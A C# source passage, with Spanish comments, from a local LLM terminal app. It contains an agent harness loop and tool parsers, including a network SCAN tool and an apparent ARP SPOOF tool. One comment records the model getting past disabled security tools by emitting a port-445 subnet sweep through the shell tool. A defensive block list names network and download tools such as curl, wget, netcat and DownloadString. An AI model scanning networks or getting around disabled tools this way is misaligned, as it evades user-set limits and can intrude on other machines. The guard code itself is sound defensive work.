    private async Task<int> RunDownloadMenu(IReadOnlyList<string> rest)
    {
        if (rest.Count > 0)
        {
            var id = rest[0].ToLowerInvariant();
            var info = ModelRegistry.Find(id);
            if (info is null)
            {
                Console.WriteLine("Modelos disponibles:");
                foreach (var model in ModelRegistry.Models)
                {
                    var downloaded = model.Url == "local" || File.Exists(Path.Combine(config.ModelDirectory, model.FileName));
                    Console.WriteLine($"  {model.Id,-15} {(downloaded ? "[instalado]" : model.SizeGb.ToString("0.0") + " GB")} {model.Name}");
                }
                return 0;
            }

            Console.WriteLine($"Descargando {info.Name} ({info.SizeGb:0.0} GB)...");
            await ModelRegistry.DownloadAsync(config.ModelDirectory, info, CancellationToken.None);
            Console.WriteLine("Descarga completa.");
            return 0;
        }

        var selected = await DownloadAndSelect();
        return selected is null ? 1 : 0;
    }

    private async Task<int> RunServerAsync(string? selector)

    {
        var model = ResolveModel(selector);
        using var cancellation = new CancellationTokenSource();
        ConsoleCancelEventHandler handler = (_, eventArgs) =>
        {
            eventArgs.Cancel = true;
            cancellation.Cancel();
        };
        Console.CancelKeyPress += handler;
        try
        {
            await using var session = new ECnetServerSession(config, model);
            Console.WriteLine($"Cargando {model.Name}...");
            await session.StartAsync(cancellation.Token);
            Console.WriteLine($"Servidor local activo: {session.BaseUrl}");
            Console.WriteLine($"API de chat: {session.BaseUrl}/v1/chat/completions");
            Console.WriteLine("Ctrl+C para detenerlo.");
            await Task.Delay(Timeout.InfiniteTimeSpan, cancellation.Token);
            return 0;
        }
        catch (OperationCanceledException)
        {
            return 0;
        }
        catch (TerminalException error)
        {
            Console.Error.WriteLine($"Error: {error.Message}");
            return 1;
        }
        finally
        {
            Console.CancelKeyPress -= handler;
        }
    }

    private static readonly Regex HarnessDonePattern = new(@"\[\[DONE\]\]", RegexOptions.Compiled);
    private const int HarnessMaxSteps = 15;

    private async Task RunHarnessAsync(ECnetServerSession session, string objective, CancellationToken cancellationToken)
    {
        if (string.IsNullOrWhiteSpace(objective))
        {
            Console.WriteLine("Uso: /harness <objetivo> — el agente trabaja por pasos (plan → herramienta → verificar) hasta dar por cumplido el objetivo.");
            return;
        }

        Console.ForegroundColor = ConsoleColor.DarkBlue;
        Console.WriteLine("//== MODO HARNESS =======================================================//");
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine($"  Objetivo: {objective}");
        Console.ForegroundColor = ConsoleColor.Gray;
        Console.WriteLine($"  Límite: {HarnessMaxSteps} pasos · Ctrl+C para abortar · escribir y crear archivos siempre piden permiso");
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine();

session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usuario: \"{objective}\".\nActuás como agente autónomo por pasos. En cada mensaje hacé UNA de estas tres cosas, y nada más:\n(a) un plan breve en pasos numerados (solo al inicio o si el plan cambia);\n(b) UNA herramienta, con tu mensaje empezando directamente por su marcador ([[READ]] ruta / [[CMD]] comando / [[WRITE]] ruta :: contenido [[END]]);\n(c) [[DONE]] seguido del resumen final, solo cuando el objetivo esté verificado como cumplido.\nTras cada herramienta recibirás el resultado real del sistema: verificalo antes del siguiente paso. Jamás afirmes que creaste un archivo o ejecutaste un comando sin la confirmación del sistema. Límite: {HarnessMaxSteps} pasos; si el objetivo no cabe, proponé lo antes posible un plan parcial alcanzable.");

        // Buffer anti-fugas (mismo criterio que AskWithNetPermissionAsync):
        // retiene la cola desde el último '[' para que los marcadores no se imprimen.
        var deniedInTurn = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var streamBuffer = new StringBuilder();
        Func<string, Task> bufferedToken = piece =>
        {
            streamBuffer.Append(piece);
            var cut = streamBuffer.ToString().LastIndexOf('[');
            if (cut < 0)
            {
                cut = Math.Max(0, streamBuffer.Length - 14);
            }
            else if (cut == 0 && streamBuffer.Length > 200 && (streamBuffer.Length < 2 || streamBuffer[1] != '['))
            {
                cut = 1;
            }

            if (cut <= 0)
            {
                return Task.CompletedTask;
            }

            var chunk = streamBuffer.ToString(0, cut);
            streamBuffer.Remove(0, cut);
            lock (GenerationNotice.Sync)
            {
                Console.Write(chunk);
            }
            return Task.CompletedTask;
        };

        Task FlushStepAsync()
        {
            if (streamBuffer.Length == 0)
            {
                return Task.CompletedTask;
            }

            var chunk = StripToolMarkers(streamBuffer.ToString());
            streamBuffer.Clear();
            if (chunk.Length == 0 || chunk.Length < 20 && chunk.Trim().StartsWith('['))
            {
                return Task.CompletedTask;
            }

            lock (GenerationNotice.Sync)
            {
                Console.Write(chunk);
            }
            return Task.CompletedTask;
        }

                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("pensando...");
                Console.ForegroundColor = ConsoleColor.Cyan;
        var content = await session.AskContinueAsync(bufferedToken, cancellationToken);
        for (var step = 1; step <= HarnessMaxSteps; step++)
        {
            cancellationToken.ThrowIfCancellationRequested();

            if (HarnessDonePattern.IsMatch(content))
            {
                streamBuffer.Clear();
                var summary = HarnessDonePattern.Replace(StripToolMarkers(content), string.Empty).Trim();
                session.ReplaceLastAssistant(summary);
                Console.WriteLine();
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[HARNESS · OBJETIVO CUMPLIDO en {step - 1} paso(s)]");
                Console.ForegroundColor = ConsoleColor.Cyan;
                if (summary.Length > 0)
                {
                    Console.WriteLine(summary);
                }
                return;
            }

            var toolRequest = MatchToolRequest(content);
            if (toolRequest is null)
            {
                // Sin marcador y sin [[DONE]]: plan/razonamiento. Se muestra y se pide la próxima acción.
                await FlushStepAsync();
                if (content.Contains("[[WRITE]]", StringComparison.Ordinal) || content.Contains("[[CMD]]", StringComparison.Ordinal) || content.Contains("[[READ]]", StringComparison.Ordinal))
                {
                    streamBuffer.Clear();
                    session.ReplaceLastAssistant(StripToolMarkers(content));
                    session.AddContextMessage("[SISTEMA · harness]\nTu mensaje contenía un marcador incompleto o mal formado (en [[WRITE]] el cierre [[END]] es obligatorio). Esa acción NO se ejecutó. Reemití UNA sola acción con el formato exacto.");
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[HARNESS] Marcador malformado; reintentando el paso...");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                }
                else if (step > 2)
                {
                    session.AddContextMessage("[SISTEMA · harness]\nPlan recibido. Ahora ejecutá: emití la próxima acción con UNA herramienta (empezando el mensaje por el marcador) o [[DONE]] si el objetivo ya está cumplido.");
                }
            }
            else
            {
                streamBuffer.Clear();
                session.ReplaceLastAssistant(StripToolMarkers(content));
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine($"[HARNESS · paso {step}/{HarnessMaxSteps}] {toolRequest.Kind}: {Truncate(toolRequest.Argument, 80)}");
                Console.ForegroundColor = ConsoleColor.Cyan;
                string toolContext;
                try
                {
                    toolContext = await ExecuteToolWithPermissionAsync(toolRequest, explicitByUser: false, cancellationToken, deniedInTurn);
                }
                catch (TerminalException toolError)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[HARNESS] error en {toolRequest.Kind}: {toolError.Message}");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    toolContext = $"[SISTEMA · herramienta {toolRequest.Kind} fallida]\n{toolError.Message}\nDecidí si reintentar de otra forma o dar el objetivo por bloqueado; no inventes el resultado.";
                }

                session.AddContextMessage(toolContext);
            }

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkBlue;
            Console.Write("IA27> ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            content = await session.AskContinueAsync(bufferedToken, cancellationToken);
        }

        streamBuffer.Clear();
        await FlushStepAsync();
        Console.WriteLine();
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine($"[HARNESS · LÍMITE ALCANZADO] Se llegó a {HarnessMaxSteps} pasos sin [[DONE]]. El modo harness se cerró; podés continuar a mano o relanzar con un objetivo más chico.");
        Console.ForegroundColor = ConsoleColor.Cyan;
    }

    private static readonly Regex PlaceholderPathPattern = new(@"TuNombreDeUsuario|NombreDeUsuario|TuUsuario|YourName|YourUser(Name)?|<\s*usuario\s*>|%USERNAME%|\bUsuario\b", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex FolderAliasPattern = new(@"\b(?<doc>documentos?|mis\s+documentos?)\b|\b(?<desk>escritorio|desktop)\b|\b(?<down>descargas?|downloads?)\b", RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static string ResolveFolderAlias(string alias)
    {
        var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        if (Regex.IsMatch(alias, "escritorio|desktop", RegexOptions.IgnoreCase))
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        }

        if (Regex.IsMatch(alias, "descargas?|downloads?", RegexOptions.IgnoreCase))
        {
            return Path.Combine(userProfile, "Downloads");
        }

        return Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
    }

    private static string PlaceholderInterceptionMessage(string badPath)
    {
        var documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        var desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        return $"[SISTEMA · ruta placeholder interceptada]\nLa ruta que emitiste (\"{badPath}\") contiene un placeholder inventado y NO se ejecutó nada. Rutas reales de este equipo: Documentos = \"{documents}\"; Escritorio = \"{desktop}\"; usuario = \"{Environment.UserName}\". Reemití la herramienta con la ruta REAL y completa (ej.: [[WRITE]] {documents}\\archivo.txt :: contenido [[END]]).";
    }

    private static readonly Regex NetRequestPattern = new(@"\[\[NET\]\]\s*(?<query>[^\r\n]*)", RegexOptions.Compiled);
    private static readonly Regex NetRefusalPattern = new(@"(no\s+tengo?\s+(?:la\s+)?capacidad\s+de\s+navegar|no\s+puedo\s+navegar|no\s+puedo\s+acceder\s+(?:a\s+)?(?:internet|la\s+web|wikipedia)|no\s+tengo?\s+(?:acceso|conexión)\s+(?:a\s+)?(?:internet|la\s+web)|sin\s+(?:acceso|conexión)\s+a\s+internet|no\s+puedo\s+buscar\s+en\s+(?:internet|la\s+web|la\s+red)|no\s+puedo\s+(?:realizar|hacer)\s+b[úu]squedas|no\s+tengo?\s+(?:la\s+)?capacidad\s+de\s+(?:buscar|realizar\s+b[úu]squedas|navegar|acceder)|no\s+tengo?\s+internet|no\s+puedo\s+proporcionar\s+informaci[oó]n\s+(?:en\s+tiempo\s+real|actual)|no\s+puedo\s+consultar\s+(?:fuentes|internet|la\s+web)|no\s+puedo\s+verificar\s+informaci[oó]n\s+actual|como\s+(?:modelo|asistente)\s+(?:de\s+)?(?:ia|inteligencia\s+artificial|lenguaje)[^.]{0,80}internet)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex ExplicitSearchIntent = new(@"^\s*(?:busca|b[úu]scame|buscar|investiga|investigar|googlea|consulta(?:r)?|averigua|averiguar|mira|mirar)\b[\s,:\-]*(?<query>.+?)\s*(?:en\s+(?:internet|la\s+web|la\s+red|google|wikipedia|la\s+wiki))?[.\s]*$|^\s*(?<query>.+?)\s+en\s+(?:internet|la\s+web|la\s+red|google|wikipedia)\s*[.\s]*$", RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static bool TryExtractExplicitSearchQuery(string prompt, out string query)
    {
        query = string.Empty;
        var match = ExplicitSearchIntent.Match(prompt);
        if (!match.Success)
        {
            return false;
        }

        var candidate = match.Groups["query"].Success ? match.Groups["query"].Value : match.Groups["query2"].Value;
        candidate = Regex.Replace(candidate, @"^\s*en\s+(?:internet|la\s+web|la\s+red|google|wikipedia|la\s+wiki)\s+(?:sobre\s+)?", string.Empty, RegexOptions.IgnoreCase);
        candidate = Regex.Replace(candidate, @"^\s*(?:informaci[oó]n|info|datos|detalles)\s+(?:sobre|de|del|acerca\s+de)\s+", string.Empty, RegexOptions.IgnoreCase).Trim(' ', '.', ',', ':', '-', '?', '¿', '!', '¡');
        candidate = Regex.Replace(candidate, @"^sobre\s+", string.Empty, RegexOptions.IgnoreCase).Trim();
        if (candidate.Length < 3 || candidate.Length > 120)
        {
            return false;
        }

        query = candidate;
        return true;
    }
    // ===== Herramientas de agente: READ / CMD / WRITE =====

    private static readonly Regex ReadRequestPattern = new(@"\[\[READ\]\]\s*(?<path>[^\r\n]+?)(?:\s*\[\[END\]\])?\s*$", RegexOptions.Compiled);
    private static readonly Regex CmdRequestPattern = new(@"\[\[CMD\]\]\s*(?<cmd>[^\r\n]+)", RegexOptions.Compiled);
    private static readonly Regex WriteRequestPattern = new(@"\[\[WRITE\]\]\s*(?<path>[^\r\n]+?)\s*::\s*(?<body>[\s\S]*?)\s*\[\[END\]\]", RegexOptions.Compiled);
    private static readonly Regex PyRequestPattern = new(@"\[\[PY\]\]\s*(?<code>[\s\S]*?)\s*\[\[END\]\]", RegexOptions.Compiled);
    private static readonly Regex YtdlpRequestPattern = new(@"\[\[YTDLP\]\]\s*(?<url>\S+)(?:\s+(?<format>\w+))?", RegexOptions.Compiled);
    private static readonly Regex ScanRequestPattern = new(@"\[\[SCAN\]\]\s*(?<range>\S+)", RegexOptions.Compiled);
    private static readonly Regex SpoofRequestPattern = new(@"\[\[SPOOF\]\]\s*(?<victim>\S+)\s+(?<router>\S+)(?:\s+(?<iface>\S+))?", RegexOptions.Compiled);
    private const string SecurityToolsDisabledReason = "las herramientas de seguridad de red están DESACTIVADAS en esta terminal. [[SCAN]] y [[SPOOF]] no se ejecutan y no debe proposes otras formas de escanear la red. Si el usuario realmente las necesita, debe habilitarlas él mismo con: config set security-tools on";

    // ===== Modo allowlist de [[CMD]] (config set cmd-mode allowlist) =====
    // Motivo: con las herramientas de seguridad apagadas, el 7B esquivó el bloqueo con
    // "[[CMD]] Test-NetConnection -ComputerName 192.168.1.1-254 -Port 445" (sesión 30/9). Apagar
    // [[SCAN]]/[[SPOOF]] no alcanza: [[CMD]] es PowerShell completo. En modo allowlist solo pasan
    // comandos de SOLO LECTURA LOCAL; nada de red, nada que escriba, nada que instale.
    private const string CmdAllowlistDisabledReason =
        "el modo seguro está activo: [[CMD]] solo admite comandos de solo lectura local (Get-*, Select-Object, Measure-Object, Test-Path, dir, cat, ipconfig, systeminfo...). No podés escanear la red, instalar nada, ni modificar el sistema. NO busques atajos: NO emitas [[CMD]] con otro comando para lograr lo mismo. Si el usuario necesita una acción bloqueada, debe desactivar el modo seguro él mismo con: config set cmd-mode full";

    // Verbos de SOLO LECTURA local. Se matchea el verbo (la parte antes del primer guion), así
    // "Get-ChildItem" cae en "get". OJO: el verbo "test" NO va acá a propósito, porque
    // "Test-NetConnection" y "Test-Connection" son los vectores de escaneo de red: solo se
    // permite el nombre exacto "test-path".
    private static readonly string[] CmdAllowedVerbs =
    {
        "get", "select", "where", "sort", "group", "foreach", "compare", "measure",
        "convertto", "convertfrom", "format", "resolve", "split", "join", "read", "write",
        "man", "help"
    };

    // Alias y comandos sin guion, con nombre exacto.
    private static readonly string[] CmdAllowedNames =
    {
        "dir", "ls", "gci", "gc", "gi", "cat", "type", "pwd", "sls", "echo", "history",
        "cls", "clear", "tree", "findstr", "sort", "more", "ipconfig", "systeminfo",
        "whoami", "hostname", "ver", "tasklist", "test-path", "measure-object", "get-childitem"
    };

    // Palabras prohibidas en cualquier parte del comando: escritura, red, descarga, instalación,
    // ejecución de código y evasión. Se chequean sobre el comando COMPLETO, y por eso también
    // cubren lo que va dentro de un script block: "Where-Object { Remove-Item C:\x }" se cae acá.
    private static readonly Regex CmdForbiddenPattern = new(
        @"(?i)\b(?:remove-item|rm\s|rd\s|rmdir|del\s|erase|move-item|rename-item|copy-item|new-item|set-content|add-content|out-file|clear-content|set-item|set-itemproperty|new-itemproperty|remove-itemproperty|new-alias|new-function|new-module|invoke-expression|\biex\b|start-process|start-job|stop-process|stop-service|restart-service|kill|taskkill|sc\s+delete|reg\s+(?:add|delete|import)|schtasks|bitsadmin|certutil|cipher|attrib|icacls|takeown|vssadmin|bcdedit|diskpart|format-volume|clear-disk|initialize-disk|set-executionpolicy|shutdown|restart-computer|stop-computer|winget|choco|scoop|pip|conda|npm|dotnet|git|msiexec|curl|wget|ssh|scp|sftp|ftp|telnet|nc\b|ncat|netcat|invoke-webrequest|invoke-restmethod|invoke-command|start-bitstransfer|test-netconnection|test-connection|ping|tracert|pathping|nslookup|resolve-dnsname|arp\b|netstat|route\b|get-nettcpconnection|import-module|install-package|add-type|downloadstring|downloadfile|new-object|set-location|cd\s|new-pssession|invoke-pester|measure-script|get-event|export-|out-file|start-sleep)\b|>|`|\$\(|\$[A-Za-z_]",
        RegexOptions.Compiled);

    private static bool IsCommandAllowedInAllowlist(string command)
    {
        if (string.IsNullOrWhiteSpace(command))
        {
            return false;
        }

        if (CmdForbiddenPattern.IsMatch(command))
        {
            return false;
        }

        // Cada segmento de una cadena (;, &, |) debe arrancar con verbo o alias permitido, así no
        // alcanza con "Get-ChildItem; Remove-Item" ni con "Get-ChildItem | Remove-Item".
        var segments = command.Split(';', '&', '|');
        foreach (var rawSegment in segments)
        {
            var segment = rawSegment.Trim().TrimStart('&', '|').Trim();
            if (segment.Length == 0)
            {
                continue;
            }

            // Un script block o paréntesis al principio significa construcción dinámica: se rechaza.
            if (segment[0] == '{' || segment[0] == '(')
            {
                return false;
            }

            var spaceIndex = segment.IndexOf(' ');
            var firstToken = spaceIndex > 0 ? segment[..spaceIndex] : segment;
            var name = Path.GetFileNameWithoutExtension(firstToken).Trim().ToLowerInvariant();
            if (name.Length == 0)
            {
                return false;
            }

            if (Array.IndexOf(CmdAllowedNames, name) >= 0)
            {
                continue;
            }

            var dash = name.IndexOf('-');
            var verb = dash > 0 ? name[..dash] : name;
            if (Array.IndexOf(CmdAllowedVerbs, verb) < 0)
            {
                return false;
            }
        }

        return true;
    }
    private static readonly Regex WriteMarkerPresent = new(@"\[\[WRITE\]\]", RegexOptions.Compiled);
    private static readonly Regex EndMarkerPattern = new(@"\[\[END\]\]", RegexOptions.Compiled);
    private static readonly Regex DangerousCommandPattern = new(@"\b(?:format|diskpart|bcdedit|vssadmin)\b|remove-item[^\r\n]*-recurse[^\r\n]*-force|rm\s+-rf|del\s+/[sq]|rd\s+/s|shutdown|restart-computer|stop-computer|reg\s+delete|takeown|icacls[^\r\n]*/reset|clear-disk|initialize-disk|set-executionpolicy\s+unrestricted", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex WriteClaimPattern = new(@"(?:he\s+creado|cre[ée]|ya\s+(?:cre[ée]|guard[ée])|acabo\s+de\s+crear)\s+(?:(?:un|una|el|la|este|esta)\s+)?(?:archivo|fichero|documento|txt|texto)|archivo\s+creado\s+en|qued[óo]\s+(?:guardado|creado)\s+en", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex CmdClaimPattern = new(@"(?:ejecut[ée]|corri[ée]|lanc[ée])\s+el\s+comando|el\s+comando\s+(?:se\s+ejecut[óo]|devolvi[óo]|mostr[óo])|resultado\s+del\s+comando", RegexOptions.Compiled | RegexOptions.IgnoreCase);

    // ===== Compuerta "el modelo entregó el artefacto en el chat en vez de usar la herramienta" =====
    // Un 7B tiene DOS formas de no actuar: mentir sobre la acción (WriteClaimPattern) y
    // negarse a actuar, enseñando el código al usuario. Esta segunda no la cubría ninguna
    // trampa: el modelo respondía "abrí el archivo y reemplazá el contenido" con el bloque
    // completo en el chat, el loop no detectaba nada y devolvía la respuesta tal cual.
    // Firma: un bloque cercado con contenido de ARCHIVO COMPLETO...
    private static readonly Regex FileArtifactPattern = new(@"<!DOCTYPE|<html[\s>]|<!doctype|<\?xml|using\s+System|#!/usr|#!/bin|^\s*package\s+\w|^\s*import\s+\w+[\.;]", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    // ...más la indicación de que lo haga el usuario a mano.
    private static readonly Regex ManualInstructionPattern = new(@"(?:pod[ée]s|puedes|podr[íi]as|deber[íi]as|ten[ée]s\s+que|tenes\s+que|hay\s+que|simplemente|entonces|as[íi])\s+[^.!?\r\n]{0,70}?\b(?:abrir|abris|abrí|reemplaz\w+|copi\w+|peg\w+|guard\w+|sobreescrib\w+|edit\w+|modific\w+|escrib\w+)\b|(?:abrir|abris|abrí|reemplaz\w+|copi\w+|peg\w+|guard\w+|escrib\w+)\s+(?:el\s+archivo|el\s+contenido|el\s+c[óo]digo|el\s+index|el\s+documento|la\s+carpeta|su\s+contenido)|te\s+guiar[ée]|te\s+muestro\s+c[óo]mo|aqu[íi]\s+te\s+muestro\s+c[óo]mo|podr[íi]as\s+(?:modificar|reemplazar|cambiar)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    // El usuario exige que use las herramientas en vez de darle el código ("tienes las herramientas hazlo tu").
    private static readonly Regex DelegationDemandPattern = new(@"\b(?:ten[ée]s\s+las\s+herramientas|us[áa]\s+las\s+herramientas|(?:hay|ten[ée]s)\s+herramientas|(?:hac[eé]|hag[áa]|resolvelo|arreglalo|guardalo|escribilo|copialo|modificalo|reemplazalo)\s+(?:t[úu]|vos|usted|directamente)|no\s+(?:me\s+)?lo\s+(?:escribas|digas|muestres|expliques)|(?:escrib[ií]lo|guardalo|modificalo|copialo|resolvelo|hacelo|escribilo)\s+(?:vos|t[úu]|directly)|no\s+lo\s+escribas\s+ac[aá]|en\s+vez\s+de\s+(?:decirme|mostrarme|escribirme|ense[ñn]arme))", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    // Borrador del modelo, para reusarlo en el reintento en vez de pedirlo de nuevo.
    private static readonly Regex CodeFencePattern = new(@"```[^\r\n`]*\r?\n(?<body>[\s\S]*?)\r?\n?```", RegexOptions.Compiled);

    private sealed record ToolRequest(string Kind, string Argument, string? Body);

    // El usuario habla español; el Qwen2.5 a veces degenera a chino (PARTE 27 / sesión 29-9).
    // Umbral: más de 10 caracteres CJK y más del 3% de las letras del texto, para no interceptar
    // una palabra china citada de pasada en una respuesta en español.
    private static readonly Regex CjkCharPattern = new(@"[一-鿿　-〿＀-￯]", RegexOptions.Compiled);
    private static readonly Regex ChineseRequestedPattern = new(@"\b(?:chin[oa]s?|mandar[ií]n|中文|al\s+chino)\b", RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static bool ContainsExcessiveCjk(string text)
    {
        if (text.Length < 20)
        {
            return false;
        }

        var cjk = 0;
        var letters = 0;
        foreach (var c in text)
        {
            if (c is >= '一' and <= '鿿')
            {
                cjk++;
                letters++;
            }
            else if (char.IsLetter(c))
            {
                letters++;
            }
        }

        return cjk > 10 && letters > 0 && cjk * 100 / letters > 3;
    }

    /// <summary>
    /// ¿El usuario denegó el permiso? Si se contara como "herramienta ejecutada", el modelo que
    /// reintenta después de una negativa se encontraría con la guarda de escritura duplicada y un
    /// bucle de "ya fue creado en este turno" sobre un archivo que en realidad nunca se escribió.
    /// </summary>
    private static bool ToolWasDenied(string context) =>
        context.StartsWith("[SISTEMA · el usuario denegó", StringComparison.Ordinal);

    private static ToolRequest? MatchToolRequest(string content)
    {
        var writeMatch = WriteRequestPattern.Match(content);
        if (writeMatch.Success)
        {
            return new ToolRequest("WRITE", RepairToolPathFromContext(TrimStrayEndMarker(writeMatch.Groups["path"].Value).Trim().Trim('"'), content), writeMatch.Groups["body"].Value);
        }

        var cmdMatch = CmdRequestPattern.Match(content);
        if (cmdMatch.Success)
        {
            var cmd = TrimStrayEndMarker(cmdMatch.Groups["cmd"].Value).Trim();
            cmd = Regex.Replace(cmd, @"\\+""", "\"");
            if (cmd.Length >= 2 && cmd.StartsWith('"') && cmd.EndsWith('"'))
            {
                cmd = cmd[1..^1].Trim();
            }
            cmd = TranslateCmdExeCommand(cmd);
            return new ToolRequest("CMD", cmd, null);
        }

        var readMatch = ReadRequestPattern.Match(content);
        if (readMatch.Success)
        {
            return new ToolRequest("READ", RepairToolPathFromContext(TrimStrayEndMarker(readMatch.Groups["path"].Value).Trim().Trim('"'), content), null);
        }

        var pyMatch = PyRequestPattern.Match(content);
        if (pyMatch.Success)
        {
            return new ToolRequest("PY", pyMatch.Groups["code"].Value.Trim(), null);
        }

        var ytdlpMatch = YtdlpRequestPattern.Match(content);
        if (ytdlpMatch.Success)
        {
            var url = ytdlpMatch.Groups["url"].Value.Trim();
            var format = ytdlpMatch.Groups["format"].Success ? ytdlpMatch.Groups["format"].Value.Trim().ToLowerInvariant() : "mp4";
            if (url.Length >= 10)
            {
                return new ToolRequest("YTDLP", url + "|" + format, null);
            }
        }

        var scanMatch = ScanRequestPattern.Match(content);
        if (scanMatch.Success)
        {
            var range = scanMatch.Groups["range"].Value.Trim();
            if (range.Length >= 7)
            {
                return new ToolRequest("SCAN", range, null);
            }
        }

        var spoofMatch = SpoofRequestPattern.Match(content);
        if (spoofMatch.Success)
        {
            var victim = spoofMatch.Groups["victim"].Value.Trim();
            var router = spoofMatch.Groups["router"].Value.Trim();
            var iface = spoofMatch.Groups["iface"].Success ? spoofMatch.Groups["iface"].Value.Trim() : "Ethernet";
            if (victim.Length >= 7 && router.Length >= 7)
            {
                return new ToolRequest("SPOOF", victim + "|" + router + "|" + iface, null);
            }
        }

        return null;
    }

    /// <summary>
    /// Repara la ruta que el modelo escribió en el marcador cuando la truncó en un espacio.
    /// "C:\Users\nicot\OneDrive\Desktop\IA" en vez de "C:\Users\nicot\OneDrive\Desktop\IA 27 T\...":
    /// la carpeta del proyecto tiene espacio, el modelo no lo respetó y el archivo se creaba en un
    /// lugar equivocado (o, peor, en un archivo basura llamado "IA"). Se busca en el PROPIO mensaje
    /// la ruta más larga que empiece por lo que el modelo puso y que exista de verdad en el disco.
    /// </summary>
    private static string RepairToolPathFromContext(string modelPath, string content)
    {
        if (modelPath.Length == 0 || LooksLikeExistingPath(modelPath))
        {
            return modelPath;
        }

        var best = modelPath;
        foreach (Match candidate in ExplicitAbsolutePathPattern.Matches(content))
        {
            var text = candidate.Value.Trim().Trim('"', '\'', ',', ';').TrimEnd('.', ',');
            if (text.Length <= best.Length)
            {
                continue;
            }

            if (!text.StartsWith(modelPath, StringComparison.OrdinalIgnoreCase))
            {
                continue;
            }

            if (LooksLikeExistingPath(text))
            {
                best = text;
            }
        }

        return best;
    }

    /// <summary>
    /// El modelo a veces cierra un [[READ]] o un [[CMD]] con [[END]], que es el cierre OBLIGATORIO
    /// solo de [[WRITE]]. Como el patrón de lectura toma todo hasta el fin de línea, ese [[END]]
    /// se quedaba pegado a la ruta y el archivo no existía ("...\index.html [[END]]").
    /// </summary>
    private static string TrimStrayEndMarker(string value) =>
        value.Replace("[[END]]", string.Empty, StringComparison.Ordinal).TrimEnd();

    /// <summary>
    /// ¿El modelo entregó el artefacto en el chat en vez de emitir el marcador?
    /// Un 7B no solo miente sobre lo que hizo: también se niega a actuar y le enseña el código al
    /// usuario ("abrí el archivo y reemplazá el contenido"). Eso no lo cubría ninguna trampa, porque
    /// WriteClaimPattern solo busca afirmaciones falsas. Se exige la FIRMA COMPLETA: bloque cercado con
    /// contenido de archivo entero (FileArtifactPattern) Y una indicación de hacerlo a mano
    /// (ManualInstructionPattern). Las dos juntas, para no interceptar una explicación normal de código.
    /// </summary>
    private static bool LooksLikeArtifactInChat(string content)
    {
        if (content.IndexOf("```", StringComparison.Ordinal) < 0)
        {
            return false;
        }

        return FileArtifactPattern.IsMatch(content) && ManualInstructionPattern.IsMatch(content);
    }

    /// <summary>
    /// Borrador del modelo (el bloque cercado más largo), para reusarlo en el reintento en vez de
    /// pedirle que lo vuelva a redactar. Sin esto el reintento cuesta el doble de tokens: el modelo
    /// ya escribió el contenido una vez y después tiene que escribirlo otra vez dentro del marcador.
    /// </summary>
    private static string ExtractDraftFromChat(string content)
    {
        var best = string.Empty;
        foreach (Match fence in CodeFencePattern.Matches(content))
        {
            var body = fence.Groups["body"].Value.Trim();
            if (body.Length > best.Length)
            {
                best = body;
            }
        }

        // Sacar las comillas triples del borde: si el modelo las copia tal cual dentro de [[WRITE]],
        // el archivo escrito arranca con "```html", que no es el archivo que el usuario pidió.
        if (best.StartsWith("```", StringComparison.Ordinal))
        {
            best = best[3..].TrimStart();
        }

        if (best.EndsWith("```", StringComparison.Ordinal))
        {
            best = best[..^3].TrimEnd();
        }

        return best;
    }

    /// <summary>
    /// ¿El usuario pidió escribir un archivo? Se combina la extracción explícita (que ya cubre
    /// "creame un txt en C:\...") con la intención de modificación y con la exigencia de delegación
    /// ("tienes las herramientas, hazlo vos"), que no traen ruta pero sí exigen que el modelo actúe.
    /// </summary>
    private bool PromptRequestsWrite(string prompt)
    {
        if (TryExtractExplicitTool(prompt, out var tool) && tool.Kind == "WRITE")
        {
            return true;
        }

        if (DelegationDemandPattern.IsMatch(prompt))
        {
            return true;
        }

        return false;
    }

    private static string StripToolMarkers(string content)
    {
        var cleaned = WriteRequestPattern.Replace(content, string.Empty);
        cleaned = CmdRequestPattern.Replace(cleaned, string.Empty);
        cleaned = ReadRequestPattern.Replace(cleaned, string.Empty);
        cleaned = PyRequestPattern.Replace(cleaned, string.Empty);
        cleaned = WriteMarkerPresent.Replace(cleaned, string.Empty);
        cleaned = EndMarkerPattern.Replace(cleaned, string.Empty);
        return cleaned.TrimEnd();
    }

    private static bool IsInsideSandbox(string path)
    {
        var roots = new[]
        {
            Path.GetFullPath(Environment.CurrentDirectory),
            Path.GetFullPath(AppContext.BaseDirectory),
            Path.GetFullPath(AppConfig.DefaultModelDirectory)
        };
        foreach (var root in roots)
        {
            if (path.StartsWith(root, StringComparison.OrdinalIgnoreCase))
            {
                return true;
            }
        }

        return false;
    }

    private static string ResolveToolPath(string rawPath)
    {
        string path;
        try
        {
            path = Path.GetFullPath(Environment.ExpandEnvironmentVariables(rawPath), Environment.CurrentDirectory);
        }
